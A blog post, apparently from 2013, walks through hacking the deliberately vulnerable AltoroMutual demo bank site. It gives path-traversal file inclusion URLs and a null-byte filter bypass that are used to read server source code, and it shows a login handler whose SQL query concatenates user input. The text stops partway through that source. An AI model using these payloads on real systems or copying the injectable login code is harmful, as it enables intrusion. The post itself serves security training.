<!doctype html>
<html lang="en">
<head><meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1" />
<meta content='text/html; charset=utf-8' http-equiv='content-type' />

<meta name="generator" content="Hugo 0.120.3">

<link href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:400,600" rel="stylesheet">
<link href="https://use.fontawesome.com/releases/v5.7.1/css/all.css" rel="stylesheet"/>
<style type="text/css">/*https://coolors.co/afd5aa-f0f2ef-a69f98-3d3d3d-8c6057*/
:root {
  --main-color: #8C6056; 
  --secondary-color: #AFD5AA;
  --logo-text-color: #fff;
  --body-text-color: #3d3d3d;
  --heading-text-color: #383838;
  --background-color: #fff;
}</style>
<link href='https://blog.dornea.nu/css/tachyons.min.css' rel="stylesheet">
<link href='https://blog.dornea.nu/css/styles.css' rel="stylesheet">
<link rel="stylesheet" href="https://blog.dornea.nu/css/custom.css">
<link rel="stylesheet" href="https://blog.dornea.nu/css/syntax.css">



<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/glightbox/dist/css/glightbox.min.css" />
<script src="https://cdn.jsdelivr.net/gh/mcstudios/glightbox/dist/js/glightbox.min.js"></script>


<link rel="icon" 
 
  href='https://blog.dornea.nu/favicon.ico'

type="image/x-icon"/>

<link href='https://blog.dornea.nu/feed.xml' rel="alternate" type="application/atom+xml" title="blog.dornea.nu" />



<script src="https://beamanalytics.b-cdn.net/beam.min.js" data-token="b8a4b728-8eda-42fb-8376-10168c622160" async>

</script>

</head>
<body class="global-font">
  <nav class="fixed w-100 bg-white bb b--black-10" id="navbar" style="z-index: 9999;">
  <div class="content-width center flex flex-wrap justify-between items-center pa3">
    
    <div class="flex items-center">
      <a class="f4 fw6 ttu no-underline dim bg-main-color pv1 ph3 br2 white" id="site-title" href='https://blog.dornea.nu/' title="Home">blog.dornea.nu</a>
    </div>

    
    <div class="dn flex-l items-center">
      
        
          <a class="link dim dark-gray f6 dib ml4 ttu tracked fw5" href='https://blog.dornea.nu/' title="Home">Home</a>
        
          <a class="link dim dark-gray f6 dib ml4 ttu tracked fw5" href='http://dornea.nu' title="About">About</a>
        
          <a class="link dim dark-gray f6 dib ml4 ttu tracked fw5" href='https://blog.dornea.nu/archive' title="Archive">Archive</a>
        
          <a class="link dim dark-gray f6 dib ml4 ttu tracked fw5" href='https://blog.dornea.nu/tags' title="Tags">Tags</a>
        
          <a class="link dim dark-gray f6 dib ml4 ttu tracked fw5" href='https://blog.dornea.nu/feed.xml' title="RSS">RSS</a>
        
          <a class="link dim dark-gray f6 dib ml4 ttu tracked fw5" href='https://brainfck.org' title="Zettelkasten">Zettelkasten</a>
        
      
    </div>

    
    <div class="db dn-l">
      <button class="bg-transparent bn pointer dim" id="menu-toggle">
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
          <line x1="3" y1="12" x2="21" y2="12"></line>
          <line x1="3" y1="6" x2="21" y2="6"></line>
          <line x1="3" y1="18" x2="21" y2="18"></line>
        </svg>
      </button>
    </div>
  </div>

  
  <div class="dn bg-white w-100 pa3 shadow-1" id="mobile-menu">
    
      
        <a class="link dim dark-gray f6 db pv2 ttu tracked fw5" href='https://blog.dornea.nu/' title="Home">Home</a>
      
        <a class="link dim dark-gray f6 db pv2 ttu tracked fw5" href='http://dornea.nu' title="About">About</a>
      
        <a class="link dim dark-gray f6 db pv2 ttu tracked fw5" href='https://blog.dornea.nu/archive' title="Archive">Archive</a>
      
        <a class="link dim dark-gray f6 db pv2 ttu tracked fw5" href='https://blog.dornea.nu/tags' title="Tags">Tags</a>
      
        <a class="link dim dark-gray f6 db pv2 ttu tracked fw5" href='https://blog.dornea.nu/feed.xml' title="RSS">RSS</a>
      
        <a class="link dim dark-gray f6 db pv2 ttu tracked fw5" href='https://brainfck.org' title="Zettelkasten">Zettelkasten</a>
      
    
  </div>
</nav>


<div class="h3"></div>

<script>
  document.addEventListener('DOMContentLoaded', function() {
    const menuToggle = document.getElementById('menu-toggle');
    const mobileMenu = document.getElementById('mobile-menu');
    
    menuToggle.addEventListener('click', function() {
      const expanded = mobileMenu.classList.contains('db');
      mobileMenu.classList.toggle('db');
      mobileMenu.classList.toggle('dn');
    });
  });
</script>

  
<main class="center mv4 content-width ph3">
  <div class="f3 fw6 heading-color heading-font post-title">Hacking Altoro Mutual</div>
  <p class="silver f6 mt1 mb4 post-meta">
    <time>06 May 2013</time> 
     | 
    

    
     ~
  

12 mins
|

    
    tags: [ <a href='https://blog.dornea.nu/tags/hacking' class="link silver">hacking</a> <a href='https://blog.dornea.nu/tags/security' class="link silver">security</a> <a href='https://blog.dornea.nu/tags/wargames' class="link silver">wargames</a> <a href='https://blog.dornea.nu/tags/web' class="link silver">web</a> <a href='https://blog.dornea.nu/tags/appsec' class="link silver">appsec</a> <a href='https://blog.dornea.nu/tags/xss' class="link silver">xss</a>  ]
    

  </p>
  <div class="lh-copy post-content">
    

      <h2 id="introduction">Introduction</h2>
<p>AltoroMutual is an vulnerable-by-design web application created by WatchFire (now AppScan Standard) as a demo test application for their BlackBox Scanner. (Source:<a href="https://www.owasp.org/index.php/AltoroMutual">https://www.owasp.org/index.php/AltoroMutual</a>)</p>
<p>The demo can be found at <a href="http://demo.testfire.net/">http://demo.testfire.net/</a>.</p>
<h2 id="vulnerabilities">Vulnerabilities</h2>
<h3 id="defaultaspxcontent">/default.aspx?content=</h3>
<p>There is a <strong>file inclusion vulnerability</strong> which we&rsquo;ll use for further investigation. URL <em><a href="http://demo.testfire.net/default.aspx?content=../testing.txt">http://demo.testfire.net/default.aspx?content=../testing.txt</a></em> will show:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">An</span> <span class="n">Error</span> <span class="n">Has</span> <span class="n">Occurred</span>
</span></span><span class="line"><span class="cl"><span class="n">Summary</span><span class="p">:</span>
</span></span><span class="line"><span class="cl"><span class="n">Could</span> <span class="ow">not</span> <span class="n">find</span> <span class="n">file</span> <span class="s1">&#39;D:downloadsAltoroMutual_v6website  esting.txt&#39;</span><span class="o">.</span>
</span></span><span class="line"><span class="cl"><span class="n">Error</span> <span class="n">Message</span><span class="p">:</span>
</span></span><span class="line"><span class="cl"><span class="n">System</span><span class="o">.</span><span class="n">IO</span><span class="o">.</span><span class="n">FileNotFoundException</span><span class="p">:</span> <span class="n">Could</span> <span class="ow">not</span> <span class="n">find</span> <span class="n">file</span> <span class="s1">&#39;D:downloadsAltoroMutual_v6website esting.txt&#39;</span><span class="o">.</span> <span class="ne">File</span> <span class="n">name</span><span class="p">:</span> <span class="s1">&#39;D:downloadsAltoroMutual_v6website  esting.txt&#39;</span> <span class="n">at</span> <span class="n">System</span><span class="o">.</span><span class="n">IO</span><span class="o">.</span><span class="n">__Error</span><span class="o">.</span><span class="n">WinIOError</span><span class="p">(</span><span class="n">Int32</span> <span class="n">errorCode</span><span class="p">,</span> <span class="ne">String</span> <span class="n">maybeFullPath</span><span class="p">)</span> <span class="n">at</span> <span class="n">System</span><span class="o">.</span><span class="n">IO</span><span class="o">.</span><span class="n">FileStream</span><span class="o">.</span><span class="n">Init</span><span class="p">(</span><span class="ne">String</span> <span class="n">path</span><span class="p">,</span> <span class="n">FileMode</span> <span class="n">mode</span><span class="p">,</span> <span class="n">FileAccess</span> <span class="n">access</span><span class="p">,</span> <span class="n">Int32</span> <span class="n">rights</span><span class="p">,</span> <span class="n">Boolean</span> <span class="n">useRights</span><span class="p">,</span> <span class="n">FileShare</span> <span class="n">share</span><span class="p">,</span> <span class="n">Int32</span> <span class="n">bufferSize</span><span class="p">,</span> <span class="n">FileOptions</span> <span class="n">options</span><span class="p">,</span> <span class="n">SECURITY_ATTRIBUTES</span> <span class="n">secAttrs</span><span class="p">,</span> <span class="ne">String</span> <span class="n">msgPath</span><span class="p">,</span> <span class="n">Boolean</span> <span class="n">bFromProxy</span><span class="p">)</span> <span class="n">at</span> <span class="n">System</span><span class="o">.</span><span class="n">IO</span><span class="o">.</span><span class="n">FileStream</span><span class="o">..</span><span class="n">ctor</span><span class="p">(</span><span class="ne">String</span> <span class="n">path</span><span class="p">,</span> <span class="n">FileMode</span> <span class="n">mode</span><span class="p">,</span> <span class="n">FileAccess</span> <span class="n">access</span><span class="p">,</span> <span class="n">FileShare</span> <span class="n">share</span><span class="p">,</span> <span class="n">Int32</span> <span class="n">bufferSize</span><span class="p">,</span> <span class="n">FileOptions</span> <span class="n">options</span><span class="p">)</span> <span class="n">at</span> <span class="n">System</span><span class="o">.</span><span class="n">IO</span><span class="o">.</span><span class="n">StreamReader</span><span class="o">..</span><span class="n">ctor</span><span class="p">(</span><span class="ne">String</span> <span class="n">path</span><span class="p">,</span> <span class="n">Encoding</span> <span class="n">encoding</span><span class="p">,</span> <span class="n">Boolean</span> <span class="n">detectEncodingFromByteOrderMarks</span><span class="p">,</span> <span class="n">Int32</span> <span class="n">bufferSize</span><span class="p">)</span> <span class="n">at</span> <span class="n">System</span><span class="o">.</span><span class="n">IO</span><span class="o">.</span><span class="n">StreamReader</span><span class="o">..</span><span class="n">ctor</span><span class="p">(</span><span class="ne">String</span> <span class="n">path</span><span class="p">)</span> <span class="n">at</span> <span class="n">System</span><span class="o">.</span><span class="n">IO</span><span class="o">.</span><span class="n">File</span><span class="o">.</span><span class="n">OpenText</span><span class="p">(</span><span class="ne">String</span> <span class="n">path</span><span class="p">)</span> <span class="n">at</span> <span class="n">Altoro</span><span class="o">.</span><span class="n">Default</span><span class="o">.</span><span class="n">LoadFile</span><span class="p">(</span><span class="ne">String</span> <span class="n">myFile</span><span class="p">)</span> <span class="ow">in</span> <span class="n">d</span><span class="p">:</span><span class="n">downloadsAltoroMutual_v6websitedefault</span><span class="o">.</span><span class="n">aspx</span><span class="o">.</span><span class="n">cs</span><span class="p">:</span><span class="n">line</span> <span class="mi">42</span> <span class="n">at</span> <span class="n">Altoro</span><span class="o">.</span><span class="n">Default</span><span class="o">.</span><span class="n">Page_Load</span><span class="p">(</span><span class="ne">Object</span> <span class="n">sender</span><span class="p">,</span> <span class="n">EventArgs</span> <span class="n">e</span><span class="p">)</span> <span class="ow">in</span> <span class="n">d</span><span class="p">:</span><span class="n">downloadsAltoroMutual_v6websitedefault</span><span class="o">.</span><span class="n">aspx</span><span class="o">.</span><span class="n">cs</span><span class="p">:</span><span class="n">line</span> <span class="mi">70</span> <span class="n">at</span> <span class="n">System</span><span class="o">.</span><span class="n">Web</span><span class="o">.</span><span class="n">Util</span><span class="o">.</span><span class="n">CalliHelper</span><span class="o">.</span><span class="n">EventArgFunctionCaller</span><span class="p">(</span><span class="n">IntPtr</span> <span class="n">fp</span><span class="p">,</span> <span class="ne">Object</span> <span class="n">o</span><span class="p">,</span> <span class="ne">Object</span> <span class="n">t</span><span class="p">,</span> <span class="n">EventArgs</span> <span class="n">e</span><span class="p">)</span> <span class="n">at</span> <span class="n">System</span><span class="o">.</span><span class="n">Web</span><span class="o">.</span><span class="n">Util</span><span class="o">.</span><span class="n">CalliEventHandlerDelegateProxy</span><span class="o">.</span><span class="n">Callback</span><span class="p">(</span><span class="ne">Object</span> <span class="n">sender</span><span class="p">,</span> <span class="n">EventArgs</span> <span class="n">e</span><span class="p">)</span> <span class="n">at</span> <span class="n">System</span><span class="o">.</span><span class="n">Web</span><span class="o">.</span><span class="n">UI</span><span class="o">.</span><span class="n">Control</span><span class="o">.</span><span class="n">OnLoad</span><span class="p">(</span><span class="n">EventArgs</span> <span class="n">e</span><span class="p">)</span> <span class="n">at</span> <span class="n">System</span><span class="o">.</span><span class="n">Web</span><span class="o">.</span><span class="n">UI</span><span class="o">.</span><span class="n">Control</span><span class="o">.</span><span class="n">LoadRecursive</span><span class="p">()</span> <span class="n">at</span> <span class="n">System</span><span class="o">.</span><span class="n">Web</span><span class="o">.</span><span class="n">UI</span><span class="o">.</span><span class="n">Page</span><span class="o">.</span><span class="n">ProcessRequestMain</span><span class="p">(</span><span class="n">Boolean</span> <span class="n">includeStagesBeforeAsyncPoint</span><span class="p">,</span> <span class="n">Boolean</span> <span class="n">includeStagesAfterAsyncPoint</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>As you can see we have found the root path of the web application which is at <code>D:downloads!AltoroMutual_v6website</code>.</p>
<h2 id="bank">/bank</h2>
<hr>
<p>You&rsquo;ll find a <strong>directory listening</strong> at <a href="http://demo.testfire.net/bank/">http://demo.testfire.net/bank/</a> which will show you a lot of information about the applications functionalities.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"> 5/31/2007 11:10 AM        &lt;dir&gt; 20060308_bak
</span></span><span class="line"><span class="cl"> 1/12/2011 10:14 PM         1831 account.aspx
</span></span><span class="line"><span class="cl"> 1/12/2011 10:14 PM         4277 account.aspx.cs
</span></span><span class="line"><span class="cl"> 1/12/2011 10:14 PM          771 apply.aspx
</span></span><span class="line"><span class="cl"> 1/12/2011 10:14 PM         2828 apply.aspx.cs
</span></span><span class="line"><span class="cl"> 1/12/2011 10:14 PM         2236 bank.master
</span></span><span class="line"><span class="cl"> 1/12/2011 10:14 PM         1134 bank.master.cs
</span></span><span class="line"><span class="cl"> 1/12/2011 10:14 PM          904 customize.aspx
</span></span><span class="line"><span class="cl"> 1/12/2011 10:14 PM         1955 customize.aspx.cs
</span></span><span class="line"><span class="cl"> 1/12/2011 10:14 PM         1806 login.aspx
</span></span><span class="line"><span class="cl"> 1/12/2011 10:14 PM         5847 login.aspx.cs
</span></span><span class="line"><span class="cl"> 1/12/2011 10:14 PM           78 logout.aspx
</span></span><span class="line"><span class="cl"> 1/12/2011 10:14 PM         3361 logout.aspx.cs
</span></span><span class="line"><span class="cl"> 1/12/2011 10:14 PM          935 main.aspx
</span></span><span class="line"><span class="cl"> 1/12/2011 10:14 PM         3951 main.aspx.cs
</span></span><span class="line"><span class="cl"> 5/31/2007 11:10 AM        &lt;dir&gt; members
</span></span><span class="line"><span class="cl"> 1/12/2011 10:14 PM         1414 mozxpath.js
</span></span><span class="line"><span class="cl"> 6/21/2011 10:29 PM          779 queryxpath.aspx
</span></span><span class="line"><span class="cl"> 1/12/2011 10:14 PM         1838 queryxpath.aspx.cs
</span></span><span class="line"><span class="cl"> 1/12/2011 10:14 PM          499 servererror.aspx
</span></span><span class="line"><span class="cl"> 1/12/2011 10:14 PM         1700 transaction.aspx
</span></span><span class="line"><span class="cl"> 1/12/2011 10:14 PM         3826 transaction.aspx.cs
</span></span><span class="line"><span class="cl"> 1/12/2011 10:14 PM         3930 transfer.aspx
</span></span><span class="line"><span class="cl"> 1/12/2011 10:14 PM         3505 transfer.aspx.cs
</span></span><span class="line"><span class="cl"> 1/12/2011 10:14 PM           82 ws.asmx
</span></span></code></pre></td></tr></table>
</div>
</div><p>Since the application is written in C# you might want to see whats behind the *.cs files. However clicking on the files will trigger following error message:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">An Error Has Occurred
</span></span><span class="line"><span class="cl">Summary:
</span></span><span class="line"><span class="cl">An unknown error occurred.
</span></span><span class="line"><span class="cl">Error Message:
</span></span></code></pre></td></tr></table>
</div>
</div><p>So you&rsquo;ll have to find another way to get to the files. We&rsquo;ll use the <strong>file inclusion vulnerability</strong> found before to do that.</p>
<p><a href="http://demo.testfire.net/default.aspx?content=../bank/login.aspx.cs">http://demo.testfire.net/default.aspx?content=../bank/login.aspx.cs</a> will result in</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Error! File must be of type TXT or HTM
</span></span></code></pre></td></tr></table>
</div>
</div><p>We&rsquo;ll have to bypass the filter in order to get the file. Remember the <strong>null string vulnerability</strong>? Here we go: <a href="http://demo.testfire.net/default.aspx?content=../bank/login.aspx.cs%EF%BF%BD.txt">http://demo.testfire.net/default.aspx?content=../bank/login.aspx.cs%00.txt</a>.</p>
<p>That will show you the content of <em>/bank/login.aspx.cs</em>. Now you can inspect the the source code to find more vulnerabilities.</p>
<h2 id="bankloginaspx">/bank/login.aspx</h2>
<p>Here is the source code (<a href="http://demo.testfire.net/default.aspx?content=../bank/login.aspx.cs%EF%BF%BD.txt">http://demo.testfire.net/default.aspx?content=../bank/login.aspx.cs%00.txt</a>):</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span><span class="lnt">146
</span><span class="lnt">147
</span><span class="lnt">148
</span><span class="lnt">149
</span><span class="lnt">150
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">using</span> <span class="n">System</span><span class="o">.</span><span class="n">Data</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="n">using</span> <span class="n">System</span><span class="o">.</span><span class="n">Data</span><span class="o">.</span><span class="n">SqlClient</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="n">using</span> <span class="n">System</span><span class="o">.</span><span class="n">Data</span><span class="o">.</span><span class="n">OleDb</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="n">using</span> <span class="n">System</span><span class="o">.</span><span class="n">Text</span><span class="o">.</span><span class="n">RegularExpressions</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="n">using</span> <span class="n">System</span><span class="o">.</span><span class="n">Web</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="n">using</span> <span class="n">System</span><span class="o">.</span><span class="n">Web</span><span class="o">.</span><span class="n">UI</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="n">using</span> <span class="n">System</span><span class="o">.</span><span class="n">Web</span><span class="o">.</span><span class="n">UI</span><span class="o">.</span><span class="n">WebControls</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="n">using</span> <span class="n">System</span><span class="o">.</span><span class="n">Web</span><span class="o">.</span><span class="n">UI</span><span class="o">.</span><span class="n">HtmlControls</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="n">using</span> <span class="n">System</span><span class="o">.</span><span class="n">Configuration</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="n">namespace</span> <span class="n">Altoro</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="n">public</span> <span class="n">partial</span> <span class="k">class</span> <span class="n">Authentication</span> <span class="p">:</span> <span class="n">Page</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">protected</span> <span class="n">void</span> <span class="n">Page_Load</span><span class="p">(</span><span class="n">object</span> <span class="n">sender</span><span class="p">,</span> <span class="n">System</span><span class="o">.</span><span class="n">EventArgs</span> <span class="n">e</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="o">//</span> <span class="n">Put</span> <span class="n">user</span> <span class="n">code</span> <span class="n">to</span> <span class="n">initialize</span> <span class="n">the</span> <span class="n">page</span> <span class="n">here</span>
</span></span><span class="line"><span class="cl">      <span class="n">Response</span><span class="o">.</span><span class="n">Cache</span><span class="o">.</span><span class="n">SetCacheability</span><span class="p">(</span><span class="n">HttpCacheability</span><span class="o">.</span><span class="n">NoCache</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="n">HtmlMeta</span> <span class="n">meta</span> <span class="o">=</span> <span class="n">new</span> <span class="n">HtmlMeta</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">      <span class="n">HtmlHead</span> <span class="n">head</span> <span class="o">=</span> <span class="p">(</span><span class="n">HtmlHead</span><span class="p">)</span><span class="n">Page</span><span class="o">.</span><span class="n">Header</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="n">meta</span><span class="o">.</span><span class="n">Name</span> <span class="o">=</span> <span class="s2">&#34;keywords&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="n">meta</span><span class="o">.</span><span class="n">Content</span> <span class="o">=</span> <span class="s2">&#34;Altoro Mutual Login, login, authenticate&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="n">head</span><span class="o">.</span><span class="n">Controls</span><span class="o">.</span><span class="n">Add</span><span class="p">(</span><span class="n">meta</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span><span class="p">(</span><span class="n">Request</span><span class="o">.</span><span class="n">Params</span><span class="p">[</span><span class="s2">&#34;passw&#34;</span><span class="p">]</span> <span class="o">!=</span> <span class="n">null</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="ne">String</span> <span class="n">uname</span> <span class="o">=</span> <span class="n">Request</span><span class="o">.</span><span class="n">Params</span><span class="p">[</span><span class="s2">&#34;uid&#34;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="ne">String</span> <span class="n">passwd</span> <span class="o">=</span> <span class="n">Request</span><span class="o">.</span><span class="n">Params</span><span class="p">[</span><span class="s2">&#34;passw&#34;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="ne">String</span> <span class="n">msg</span> <span class="o">=</span> <span class="n">ValidateUser</span><span class="p">(</span><span class="n">uname</span><span class="p">,</span> <span class="n">passwd</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">msg</span> <span class="o">==</span> <span class="s2">&#34;Success&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">Response</span><span class="o">.</span><span class="n">Redirect</span><span class="p">(</span><span class="s2">&#34;main.aspx&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="n">message</span><span class="o">.</span><span class="n">Text</span> <span class="o">=</span> <span class="s2">&#34;Login Failed: &#34;</span> <span class="o">+</span> <span class="n">msg</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="n">protected</span> <span class="n">string</span> <span class="n">ValidateUser</span><span class="p">(</span><span class="ne">String</span> <span class="n">uName</span><span class="p">,</span> <span class="ne">String</span> <span class="n">pWord</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="o">//</span><span class="n">Set</span> <span class="n">default</span> <span class="n">status</span> <span class="n">to</span> <span class="n">Success</span>
</span></span><span class="line"><span class="cl">      <span class="n">string</span> <span class="n">status</span> <span class="o">=</span> <span class="s2">&#34;Success&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="n">OleDbConnection</span> <span class="n">myConnection</span> <span class="o">=</span> <span class="n">new</span> <span class="n">OleDbConnection</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">      <span class="n">myConnection</span><span class="o">.</span><span class="n">ConnectionString</span> <span class="o">=</span> <span class="n">ConfigurationManager</span><span class="o">.</span><span class="n">ConnectionStrings</span><span class="p">[</span><span class="s2">&#34;DBConnStr&#34;</span><span class="p">]</span><span class="o">.</span><span class="n">ConnectionString</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="n">myConnection</span><span class="o">.</span><span class="n">Open</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">      <span class="n">string</span> <span class="n">query2</span> <span class="o">=</span> <span class="s2">&#34;SELECT * From users WHERE username = &#39;&#34;</span> <span class="o">+</span> <span class="n">uName</span> <span class="o">+</span> <span class="s2">&#34;&#39;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="n">string</span> <span class="n">query1</span> <span class="o">=</span> <span class="n">query2</span> <span class="o">+</span> <span class="s2">&#34; AND password = &#39;&#34;</span> <span class="o">+</span> <span class="n">pWord</span> <span class="o">+</span> <span class="s2">&#34;&#39;&#34;</span><span class="p">;</span>
